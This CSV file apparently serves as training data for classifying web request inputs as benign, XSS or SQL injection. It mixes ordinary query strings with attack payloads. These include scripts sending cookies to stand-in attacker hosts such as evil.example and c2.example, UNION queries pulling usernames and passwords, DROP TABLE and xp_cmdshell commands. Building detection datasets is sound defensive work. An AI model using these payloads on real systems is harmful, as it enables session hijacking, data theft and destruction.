payload,label
<img src=x onerror=alert(1)>,xss
sort=asc&ref=book,benign
<style>@import 'http://evil.example/xss.css';</style>,xss
user_id=2057,benign
1' AND 1=1 --,sqli
<script>alert('xss')</script>,xss
<img src=x onerror=this.src='http://evil.example/'+document.cookie>,xss
currency=usd&lang=en&city=report,benign
category=delta&session=27f1637,benign
' OR '1'='1,sqli
<video><source onerror=alert(1)></video>,xss
theme=dark&limit=379&currency=usd,benign
lang=id&price_min=2194,benign
lang=en&currency=usd&ref=book,benign
name=settings&token=3bdf2a8,benign
<input onfocus=alert(1) autofocus>,xss
category=camera,benign
price_max=8067&lang=en,benign
search=dashboard&tab=foxtrot,benign
' OR SLEEP(5)='0,sqli
limit=6276,benign
category=profile&size=m,benign
1' AND 1=1 --,sqli
admin' --,sqli
q=camera&price_min=3864&size=m,benign
') OR ('1'='1,sqli
<script>new Image().src='http://c2.example/?c='+document.cookie;</script>,xss
user_id=8038&city=settings,benign
theme=dark&coupon=dashboard,benign
color=foxtrot&email=jakarta@example.com,benign
view=grid&format=json&tab=foxtrot,benign
search=foxtrot&theme=dark,benign
""" UNION SELECT table_name FROM information_schema.tables --",sqli
<svg onload=alert(1)>,xss
1' AND SLEEP(7) --,sqli
1' AND 1=1 --,sqli
category=settings,benign
price_min=9395&session=1847684,benign
"' UNION SELECT username, password FROM users --",sqli
<svg onload=alert(1)>,xss
tab=invoice&color=invoice,benign
price_min=5978,benign
price_min=5254&price_max=2348,benign
<details open ontoggle=alert(1)>,xss
"' UNION SELECT NULL, NULL, NULL --",sqli
"<a href=""javascript:alert(1)"">click</a>",xss
""" UNION SELECT table_name FROM information_schema.tables --",sqli
color=foxtrot,benign
user_id=169,benign
<body onload=alert('xss')>,xss
'; DROP TABLE users; --,sqli
email=phone@example.com&page=9985&currency=usd,benign
coupon=delta,benign
<iframe src=javascript:alert(1)>,xss
tab=camera&price_min=2833&size=m,benign
qty=5543,benign
q=jakarta&coupon=jakarta&limit=6746,benign
coupon=report,benign
redirect=/home&qty=8043&color=phone,benign
category=dashboard,benign
user_id=999&offset=2870,benign
' OR '1'='1,sqli
'><script>alert(1)</script>,xss
tab=dashboard&size=m,benign
<script>alert(document.cookie)</script>,xss
session=3e68086,benign
<svg onload=alert(1)>,xss
"""><script>alert(1)</script>",xss
' OR EXISTS(SELECT * FROM users) --,sqli
<script>eval(atob('YWxlcnQoMSk='))</script>,xss
qty=4531&view=grid,benign
sort=desc&theme=dark&color=alice,benign
page=268&user_id=4946&price_max=3636,benign
ref=dashboard&name=phone&qty=5119,benign
1 OR 1=1,sqli
<script>alert(document.cookie)</script>,xss
' AND (SELECT COUNT(*) FROM users) > 0 --,sqli
session=3691889&callback=profile,benign
' OR '1'='1,sqli
<input onfocus=alert(1) autofocus>,xss
' OR 1=1 --,sqli
' OR '1'='1,sqli
<div onmouseover=alert(1)>hover</div>,xss
page=9823,benign
sort=asc&id=9728,benign
page=2522&lang=id&color=delta,benign
sort=desc&offset=2206,benign
' OR SLEEP(6)='0,sqli
name=orders&sort=desc,benign
""" UNION SELECT table_name FROM information_schema.tables --",sqli
<iframe src=javascript:alert(1)>,xss
<script>alert('xss')</script>,xss
' AND (SELECT COUNT(*) FROM users) > 0 --,sqli
page=6437,benign
price_max=8971&ref=invoice&city=citra,benign
<video><source onerror=alert(1)></video>,xss
<script>document.location='http://evil.example/'+document.cookie</script>,xss
' GROUP BY password HAVING 1=1 --,sqli
<marquee onstart=alert(1)>,xss
callback=invoice,benign
admin' --,sqli
lang=en&callback=delta,benign
theme=dark&price_min=1103&sort=desc,benign
<script>alert('xss')</script>,xss
"' UNION SELECT NULL, NULL, NULL --",sqli
page=9373&price_min=3644&format=json,benign
' AND (SELECT COUNT(*) FROM users) > 0 --,sqli
1; EXEC xp_cmdshell('dir') --,sqli
color=shoes&city=shoes&view=grid,benign
<script>new Image().src='http://bad-host.example/?c='+document.cookie;</script>,xss
redirect=/home&lang=en&q=jakarta,benign
lang=en,benign
city=budi&redirect=/home,benign
<script>alert(document.cookie)</script>,xss
id=6671&offset=9153&search=orders,benign
<script>new Image().src='http://c2.example/?c='+document.cookie;</script>,xss
session=3208a8c&price_min=2955,benign
<marquee onstart=alert(1)>,xss
city=echo&coupon=phone,benign
session=4449da7&currency=usd,benign
email=orders@example.com&token=3268c40,benign
' AND (SELECT COUNT(*) FROM users) > 0 --,sqli
id=2823,benign
token=57ca662&search=phone&price_max=7998,benign
<script>eval(atob('YWxlcnQoMSk='))</script>,xss
1' AND 1=1 --,sqli
size=m&offset=3081&user_id=2239,benign
' HAVING 1=1 --,sqli
ref=delta,benign
user_id=558&offset=1507&category=foxtrot,benign
qty=7553,benign
ref=citra&price_max=9065,benign
1; EXEC xp_cmdshell('dir') --,sqli
""" UNION SELECT table_name FROM information_schema.tables --",sqli
' OR '1'='1,sqli
city=report&view=grid,benign
admin' --,sqli
sort=asc&size=m,benign
format=json&limit=5027,benign
<style>@import 'http://evil.example/xss.css';</style>,xss
offset=3372,benign
""" UNION SELECT table_name FROM information_schema.tables --",sqli
<script>new Image().src='http://evil.example/?c='+document.cookie;</script>,xss
size=m&theme=dark,benign
' HAVING 1=1 --,sqli
<img src=x onerror=this.src='http://evil.example/'+document.cookie>,xss
<script>fetch('http://evil.example/steal?c='+document.cookie)</script>,xss
lang=en&sort=desc&redirect=/home,benign
city=settings,benign
' OR '1'='1,sqli
<marquee onstart=alert(1)>,xss
<marquee onstart=alert(1)>,xss
tab=surakarta&redirect=/home&email=budget@example.com,benign
') OR ('1'='1,sqli
tab=shoes&limit=7787,benign
limit=9799,benign
<video><source onerror=alert(1)></video>,xss
qty=2000&format=json&lang=id,benign
user_id=622&search=foxtrot&email=citra@example.com,benign
limit=2718&theme=dark&qty=9280,benign
<svg onload=alert(1)>,xss
sort=desc&view=grid&q=orders,benign
<iframe src=javascript:alert(1)>,xss
sort=desc&view=grid&lang=id,benign
redirect=/home&color=echo,benign
' OR 2=7 --,sqli
' OR 'a'='a,sqli
<script>document.location='http://attacker.test/'+document.cookie</script>,xss
admin' --,sqli
user_id=7439&format=json&theme=dark,benign
callback=citra,benign
admin' --,sqli
sort=desc&price_min=5655,benign
ref=citra&token=4754d96,benign
color=budget&category=laptop&price_min=8822,benign
'; DROP TABLE users; --,sqli
<script>new Image().src='http://attacker.test/?c='+document.cookie;</script>,xss
<script>new Image().src='http://evil.example/?c='+document.cookie;</script>,xss
qty=4067&user_id=6819&sort=asc,benign
user_id=9330,benign
admin' --,sqli
price_min=7224&q=surakarta,benign
user_id=6825,benign
q=settings,benign
1' AND SLEEP(5) --,sqli
price_min=9791,benign
"' UNION SELECT NULL, NULL, NULL --",sqli
"' UNION SELECT NULL, NULL, NULL --",sqli
' GROUP BY password HAVING 5=9 --,sqli
<script>eval(atob('YWxlcnQoMSk='))</script>,xss
qty=5734,benign
theme=dark&size=m,benign
<body onload=alert('xss')>,xss
id=2469&limit=3559&sort=asc,benign
<details open ontoggle=alert(1)>,xss
<body onload=alert('xss')>,xss
tab=report&name=shoes&color=shoes,benign
lang=en&city=orders,benign
token=2ed1640&format=json,benign
city=budi&session=beba3a,benign
price_max=8334&sort=asc&search=alice,benign
q=citra&qty=1660,benign
search=budi,benign
<svg onload=alert(1)>,xss
callback=dashboard&size=m,benign
email=settings@example.com&id=6866,benign
format=json&token=3573626&lang=en,benign
format=json&coupon=book,benign
' AND (SELECT COUNT(*) FROM users) > 0 --,sqli
sort=desc&format=json&page=1670,benign
format=json&color=citra,benign
page=3269,benign
1' AND 2=2 --,sqli
category=orders&ref=jakarta&price_min=4307,benign
<style>@import 'http://evil.example/xss.css';</style>,xss
<img src=x onerror=alert(1)>,xss
<script>eval(atob('YWxlcnQoMSk='))</script>,xss
qty=3044&ref=book&session=12f212c,benign
' GROUP BY password HAVING 1=1 --,sqli
""" UNION SELECT table_name FROM information_schema.tables --",sqli
<script>fetch('http://evil.example/steal?c='+document.cookie)</script>,xss
qty=603&lang=id,benign
""" OR ""1""=""1",sqli
1 OR 1=1,sqli
user_id=6132&search=alice&sort=desc,benign
email=phone@example.com,benign
<marquee onstart=alert(1)>,xss
lang=en&price_max=2911,benign
' OR 'a'='a,sqli
' OR EXISTS(SELECT * FROM users) --,sqli
session=3aa6d07&price_max=6932,benign
<svg onload=alert(1)>,xss
1' AND 1=1 --,sqli
'><script>alert(1)</script>,xss
callback=foxtrot&token=4d85b7b,benign
<img src=x onerror=alert(1)>,xss
<script>eval(atob('YWxlcnQoMSk='))</script>,xss
email=surakarta@example.com&page=8420,benign
offset=6956&tab=jakarta&sort=asc,benign
1' AND SLEEP(5) --,sqli
format=json&sort=desc&currency=usd,benign
size=m&page=9618&search=settings,benign
<svg onload=alert(1)>,xss
id=3316,benign
size=m&sort=desc,benign
color=delta&callback=foxtrot,benign
coupon=book&callback=report,benign
<input onfocus=alert(1) autofocus>,xss
q=surakarta,benign
redirect=/home&sort=asc,benign
"""><script>alert(1)</script>",xss
<input onfocus=alert(1) autofocus>,xss
') OR ('1'='1,sqli
token=1aeefb9,benign
admin' --,sqli
<style>@import 'http://evil.example/xss.css';</style>,xss
' OR SLEEP(9)='0,sqli
1; EXEC xp_cmdshell('dir') --,sqli
token=1d0b159&lang=en,benign
format=json,benign
"' UNION SELECT username, password FROM users --",sqli
1' AND 1=1 --,sqli
search=book&offset=7430&user_id=5299,benign
